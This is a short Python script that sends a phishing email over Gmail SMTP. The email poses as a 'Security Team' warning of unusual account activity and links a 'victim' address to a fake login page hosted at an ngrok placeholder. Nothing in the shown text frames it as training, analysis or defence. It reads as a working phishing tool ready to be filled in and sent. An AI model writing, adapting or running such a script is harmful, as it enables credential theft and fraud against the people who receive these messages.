import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_email(target_email, fake_login_url):
    # Sender email credentials
    sender_email = "your_email@example.com"
    sender_password = "your_password"

    # Email content
    subject = "Important: Verify Your Account"
    body = f"""
    <html>
    <body>
        <h1>Account Verification Required</h1>
        <p>Dear User,</p>
        <p>We noticed unusual activity in your account. Please verify your account by clicking the link below:</p>
        <a href="{fake_login_url}" target="_blank">Verify Now</a>
        <p>Thank you,<br>Security Team</p>
    </body>
    </html>
    """

    # Set up the email
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = target_email
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "html"))

    # Send the email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
        print(f"Email sent to {target_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Usage example
if __name__ == "__main__":
    target_email = "victim@example.com"
    fake_login_url = "http://your_ngrok_url_here"
    send_email(target_email, fake_login_url)
